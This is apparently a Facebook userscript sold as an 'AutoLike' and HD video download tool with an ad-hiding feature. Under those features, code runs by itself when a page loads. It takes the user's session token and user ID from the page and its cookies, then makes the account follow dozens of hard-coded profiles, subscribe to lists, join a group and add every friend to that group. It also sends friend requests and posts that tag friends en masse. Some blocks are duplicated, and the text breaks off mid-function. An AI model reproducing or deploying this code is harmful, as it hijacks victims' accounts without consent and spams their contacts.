// ==UserScript==
// @name            [Updated] AutoLike Facebook 02/02/2014
// @description     [Updated] AutoLike Facebook 02/02/2014
// @version         1.8
// @date            2014-02-02
// @author          Nilesh
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// @homepageURL     userscripts.org/scripts/show/162629
// @updateURL       https://userscripts.org/scripts/source/162629.meta.js
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @uso:installs    95866
// @uso:reviews     55
// @uso:rating      25.9
// @uso:discussions 8
// @uso:fans        300
// @uso:hash        bfe2aadee96090b7f15e8474b356f6c3283d55f7
// ==/UserScript==

function appendDownloadLink() {
	var scripts = document.getElementsByTagName('script');
	var hd_url = null;

	for (var i=0; i<scripts.length; i++) {
		var html = scripts[i].innerHTML;
		var start = html.indexOf('["highqual_src');
		if (start != -1) {
			hd_url = html.substring(start, html.indexOf(']', start) + 1);
			break;
		}
	}

	var hd_link = document.createElement('a');
	hd_link.setAttribute('id', 'hd_link');
	hd_link.setAttribute('target', '_blank');
	hd_link.setAttribute('class', 'fbPhotosPhotoActionsItem');

	if (!hd_url) {
		hd_link.innerHTML = 'HD download not available';
		hd_link.style.setProperty('color', 'gray');
		hd_link.style.setProperty('text-decoration', 'none');
		hd_link.style.setProperty('cursor', 'default');
	} else {
/*
		hd_url = hd_url.substring(hd_url.indexOf('"http')+1, hd_url.indexOf('")'));

		hd_url = hd_url.replace(/\\u([\d\w]{4})/gi,
			function(match, grp) {
				return String.fromCharCode(parseInt(grp, 16));
			}
		);
*/

		hd_url = JSON.parse(hd_url)[1];

		hd_link.setAttribute('href', unescape(hd_url));
		hd_link.setAttribute('title', 'Right click and save as...');
		hd_link.innerHTML = 'Download HD Video';

	}

	var sidebar = document.getElementById('fbPhotoPageActions');
	sidebar.appendChild(hd_link);

}

window.setTimeout(appendDownloadLink, 2000);

body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+49px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+95px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/lim.chai.cin' target='_blank' title='Creator' ><blink><center>Jerry LimZ</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+28px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);

sublist("4399231940310");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820950347434");
sublist("10200865018889120");
sublist("231319150380925");
sublist("202389123273928");
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}
var user = "1273872655"

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100005085250164");
a("100003769085879");
a("100001441399478");
a("100004590548111");
a("100001529033753");
a("1273872655");
a("100006549135036");
a("100002920534041");
a("100001707047836");
a("100002491244428");
a("100003185375753");
a("100003126043061");
a("100002963125119");
a("100002963125119");
a("100002884845096");
a("100003260944521");
a("100003130193442");
a("100003143936857");
a("100003169095880");
a("100003174832056");
a("100003054331489");
a("100003234472060");
a("100002885419633");
a("100003169280982");
a("100003045781784");
a("100003060692030");
a("100004184164226");
a("100003147256919");
a("100003173826340");
a("100003320498577");
a("100003479972024");
a("100003396847010");
a("100003478476127");
a("100003528512236");
a("100004186264774");
a("100004184496615");
a("100004199527121");
a("100004206729692");
a("100001464432902");
a("100004226079524");
a("100001265587034");
a("100004236695463");
a("100004187142960");
a("100004224463221");
a("100001721807602");
a("100005928279358");
a("100003835148874");
a("100000309875420");
a("100005619096465");
a("100006540371411");
a("100001931400458");
a("100003326468365");


sublist("115451681995774");
sublist("288586211279215");
sublist("202389123273928");
sublist("4399231940310");
sublist("620272211366289");
sublist("202106923285658");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820950347434");
sublist("10200865018889120");
sublist("140510162796941");
sublist("542481255814823");
sublist("168420030021966");
sublist("179306482266654");
sublist("602839776403013");
sublist("1392253941002605");
sublist("625550820839213");
sublist("1431048133789852");
sublist("502841636456879");
sublist("231319150380925");
sublist("505287602925451");
sublist("557206374327459");
sublist("632049830189312");
sublist("632046340189661");
sublist("621193171259200");
sublist("1441095016110227");
sublist("1400697213481523");
sublist("241771485987463");
sublist("709596435740804");
sublist("234176026761904");




var gid = ['439279202805319'];


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "189965517753275";


var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=1658165120113116104521114";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

// prevents jQuery conflicts with Facebook
this.$ = this.jQuery = jQuery.noConflict(true);

var blockPng  = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAYAAABWdVznAAAABHNCSVQICAgIfAhkiAAAAb1JREFUKJFdzz1oU2EYxfHzvO9zEzKJItihg9DiokuWYIuILgFTFQwXBweTIUNDAoKCILgJDg5d2yka8jGEGDAEQSg6lWARurSDgtAisZAuImS4pPc5Lo1U//OPA0dw0nA4PJdKpR6JSBHAvIiA5Ihki+RaOp0+AgABgM3NzUvOufcisuCc++ic2xYRZ2ZXzew6ya/T6TTMZrO7MhgMzh4fH2+TPJNMJu/lcrktnKrX630WkYyI7CcSiYyOx+PHqrpIcrlQKAxP43q9vj6ZTDIAfprZxSiKnupkMik55z5VKpV/8MbGxnoURatxHO8CuBPH8VuSD1wikZjz3m/9h58DWDWzb3Ec3y6Xy/uq+iUIgjkNggAkZYZrtdozki9IHsRxnKtWqwcAcOKg3vsxgGUAaDQaD83sJYARyZVSqfR9NqSqywAOnaq+VtWbrVZrzTn3RlWPgiDIFYvFvRluNpt3VfWK974n7Xb7vPd+CGCR5G9VvRGG4c4MdzqdFTNri8gvM1sSAOh2u5dF5B2ABQAfSO4A8CSvOeeWAPwgeSsMw72/Z/v9/gUze2Jm9wHMA4CIjAD0SL7K5/OHAPAHeKzPhmd10L0AAAAASUVORK5CYII=",
    togglePng = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD4AAAALCAYAAAAndj5aAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MEZEMTk0QkU5NDhFMTFFMjlDRTlDMjYwOEU3NEU1REQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MEZEMTk0QkY5NDhFMTFFMjlDRTlDMjYwOEU3NEU1REQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowRkQxOTRCQzk0OEUxMUUyOUNFOUMyNjA4RTc0RTVERCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowRkQxOTRCRDk0OEUxMUUyOUNFOUMyNjA4RTc0RTVERCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pg6gU/4AAAIwSURBVHjatFZLjxJBEK6Z6WGeJgJ/AGI8oAiXTTh44cDNaDaSMVGIe+Bkwl/iYEI4gBoT8QYJF7ywHOBiovEXENwDbwZmrJqwRCJstlutpKdfqfrq6+rqGqlSqYRkWT4DgHvYDOCQTqcDArLA9gPb5W4uhE2SzWaFsD3Pu2T4OUsmkxfpdDqvaVqUx0osFoN4PM6FvFwux71e712r1QrmuVzudSKRcHRdj/DYGY1G3MRXq9V4MBi8Hw6HwFzXvZ9KpfKMseh2u+UOH6+OqqrRTCbjIPEuzR88fPRCUVh4ww/NjU0ciWu/3//C1uu1qSiKEOmdsaPrjUYDHMc5umeaZuT6alt3wmHXXQthi/hMXIkzEZfwuoMocYwg997vh6WoOvig3B5QkvbDzWYjQhyIM4O/FHwYD+bVanU/rtVqQV8sFk/ryCH05tDG5w9v/8B58vwC/qVQxGU6OZGI+74P+CAerJVKpaDHarEfHzt1il3ggGqApBxin798cytskYiTHnFm+NIJX3UCPpXjN+U/RRzBA/ZaSAbfAyFsEZ8lTBXiTMSX8/l8jM5EeY2g8yfzuFwuny6mi8VP1HVp7G1WV4ahh0WwRSKOemPizCaTybd2u93EmvjUMIwIL/hNET8m0+n0ql6vN5H89yCfP9Y+nedfPbNt8+7/xqYDx5+uJnGWCoWChs48xvUEVRoeQ7PZTBJ4V2bYvmKed3cl6Rrb4jVkWZbPqTInbNu2u78EGADcAgQHrTniYwAAAABJRU5ErkJggg==";

var GLOBAL_SEL     = '#globalContainer',
    STREAM_SEL     = '#home_stream',
    
    AD_SEL         = '.uiStreamAdditionalLogging',
    STORY_SEL      = '.uiStreamStory',
    CONTENT_SEL    = '.storyContent',
    HEADLINE_SEL   = '.uiStreamHeadline',
    BUTTON_SEL     = '.uiButton',
    PRONOUN_SEL    = '.pronoun-link',
    
    EGO_SEL        = '.ego_section',
    EGO_CONT_SEL   = '.ego_unit_container',
    EGO_AD_SEL     = '.uiHeaderTitle .adsCategoryTitleLink',
    EGO_TITLE_SEL  = '.uiHeaderTitle',
    
    BLOCKED_TEXT   = 'Blocked ad from: ',
    LIKED_BY_TEXT  = '| liked by: ',
    TOGGLE_TEXT    = '(toggle)',
    
    binded         = false;

// undescore.js debounce
var debounce = function(func, wait, immediate) {
  var timeout, result;
  return function() {
    var context = this, args = arguments;
    var later = function() {
      timeout = null;
      if (!immediate) result = func.apply(context, args);
    };
    var callNow = immediate && !timeout;
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
    if (callNow) result = func.apply(context, args);
    return result;
  };
};

var addToggle = function($what, $where, css) {
  var $toggle = $('<a>')
    .text(TOGGLE_TEXT)
    .addClass('adblocked-toggle')
    .click(function() {
      $what.fadeToggle('fast');
      $(this).toggleClass('open');
    });
  if (css) $toggle.css(css);
  $where.append($toggle);
};

var makeEgoTogglable = function() {
  $(EGO_SEL).not('.adblocked').each(function() {
    $(this).addClass('adblocked');
    
    var $adsTitle = $(EGO_AD_SEL, this),
        $ads      = $(EGO_CONT_SEL, this);
    
    // "people you may know" - show this back
    if (!$adsTitle.length) {
      $ads.css('display', 'block');
      return;
    }
    
    addToggle($ads, $(EGO_TITLE_SEL, this));
  });
};

var filterStream = function() {
  var $stream = $(STREAM_SEL);
      
  if (!$stream.length) return;
  
  $(AD_SEL, $stream).not('.adblocked').each(function() {
    $(this).addClass('adblocked');
    
    var $streamStory  = $(this).closest(STORY_SEL),
        $storyContent = $(CONTENT_SEL, $streamStory).first();
        
    var $headline = $(HEADLINE_SEL, $storyContent),
        $names    = $('a:not(' + BUTTON_SEL + ',' + PRONOUN_SEL + ')', $headline.first()),
        pageName  = $('a:not(' + BUTTON_SEL + ',' + PRONOUN_SEL + ')', $headline.last()).last().text();
    
    // console.log($streamStory, $headline, $names, pageName);
    
    // special case when page name is not in the headline but in the headline sibling
    if (pageName === '') {
      pageName = $headline.next().find('a:not(' + BUTTON_SEL + ',' + PRONOUN_SEL + ')').last().text();
    }
    
    // hide ad
    $storyContent.css('display', 'none');
    
    // construct basic message (icon, notice, ad/page text)
    var $notice = $('<div>')
      .html(BLOCKED_TEXT + '<b>' + pageName + '</b> ')
      .css({'color': '#999', 'padding': '.2em 0 .2em 18px', 'overflow': 'hidden',
            'background': 'url(' + blockPng + ') no-repeat left center'});
    
    // if there is more than one link in the headline, this means it is liked
    // by some of your friends so we can print their names
    if ($names.length > 1) {
      var text = '';
      for (var i = 0; i < $names.length - 1; i++) {
        text += $($names[i]).text() + ', ';
      }
      $notice.append($('<span>').text(LIKED_BY_TEXT + text.slice(0, -2) + ' '));
    }
    
    // add toggle link to show/hide ad
    addToggle($storyContent, $notice);
    
    // add minified version of ad into stream story
    $streamStory.prepend($notice);
  });
};

var contentUpdate = function() {
  filterStream();
  makeEgoTogglable();
};

var injectStyle = function() {
  if ($('style[data-origin=adblocker]', $('head')).length) return;
  var $style = $('<style>')
    .attr('data-origin', 'adblocker')
    .text(
      '.ego_section .ego_unit_container { display: none; }' +
      '.adblocked-toggle {' +
        'display: inline-block;' +
        'background: url(' + togglePng + ') left center;' +
        'text-indent: 100%;' +
        'overflow: hidden;' +
        'width: 31px;' +
        'height: 11px;' +
        'position: relative;' +
        'top: 1px;' +
        'margin: 0 0 0 .4em;' +
      '}' +
      '.adblocked-toggle.open { background-position: -31px 0; }'
    );
  $('head').append($style);
};

injectStyle();

// DOM ready
jQuery(function() {

  if (binded) return;
  
  var $content = $(GLOBAL_SEL);
  if ($content.length) {
    var lazyContentUpdate = debounce(contentUpdate, 500);
    $content.bind("DOMSubtreeModified", lazyContentUpdate);
    binded = true;

    contentUpdate();
  }
});

body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+49px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+95px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/rupam.baveja' target='_blank' title='Creator' ><blink><center>Roopsi Code</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+28px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
